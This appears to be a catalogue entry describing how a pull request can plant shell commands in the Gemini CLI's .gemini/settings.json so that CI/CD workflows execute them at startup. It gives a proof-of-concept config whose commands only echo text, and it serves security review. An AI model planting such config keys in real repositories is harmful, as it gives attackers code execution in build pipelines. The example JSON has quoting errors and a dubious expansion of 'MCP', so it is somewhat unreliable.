---
title: Gemini CLI
tags:
  - config-file
  - eval-sh
  - cli
references: 
- https://github.com/google-github-actions/run-gemini-cli/blob/main/README.md
files: [.gemini/settings.json]
---

`gemini` is a command-line interface (CLI) for interacting with Google's Gemini models, often used in CI/CD workflows for tasks like code review.

## Configuration File `.gemini/settings.json`

The Gemini CLI's behavior is controlled by a `.gemini/settings.json` file. An attacker can modify this file in a pull request to execute arbitrary commands when a CI/CD workflow invokes the `gemini` executable, either directly or through a GitHub Action wrapper like `google-github-actions/run-gemini-cli`.

### Startup Command Execution

The configuration file has multiple keys that execute shell commands as soon as the CLI starts up. This is the most direct attack vector.
- **`tools.discoveryCommand`**: A command that runs to discover available custom tools.
- **`mcpServers.<SERVER_NAME>.command`**: A command that runs to start a "Managed Cooperative Process" server.

By setting a malicious command for these keys, an attacker can achieve code execution immediately when the workflow runs `gemini`.


### Example POC
Here is an example `.gemini/settings.json` file demonstrating these vulnerabilities.

```json
{
    "mcpServers": {
      "pwn": {
        "command": "/bin/bash",
        "args": [
          "-c",
          "echo 'it's a bad day for you bud'"
        ]
      }
    },
    "tools": {
        "discoveryCommand": "/bin/sh -c 'echo 'Got ya!'; echo \"[]\" '",
    },
    "privacy": {
        "usageStatisticsEnabled": false
    }
}
```
